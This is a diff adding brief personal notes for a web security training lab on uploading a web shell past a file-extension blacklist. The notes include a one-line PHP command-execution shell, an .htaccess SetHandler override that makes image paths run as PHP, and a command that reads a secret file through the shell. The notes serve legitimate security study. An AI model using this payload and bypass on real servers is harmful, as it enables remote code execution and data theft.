@@ -37,4 +37,12 @@ IF php extension is blocked, we can try other extensions like .php5, .shtml, .ph
 
 #4 Lab: Web shell upload via extension blacklist bypass
 
-    1.avatars/ex.php5
+    1. Upload a normal image and see the response.
+    2. Look for my-account/avatar and send to repeater, files/avatars/image.jpg send to repeater 
+    3  In files/avatars/image.jpg remove the bifurcated data and in my-account/avatar write php shell code, <?php system($_GET['evil']); and snd the request
+    4. See the Apache veersion and its vulnerable and in /my-account/avatar change filename to ".htaaccess" nd remove the php payload from it .
+    5. Add SetHandler application/x-httpd-php instead of payload and send the request.
+    6. Access the uploaded web shell via browser and execute commands. using /files/avatars/image.jpg?evil=cat+/home/carlos/secret
+
+
+-------------------------------------------------------------------------------------------------------
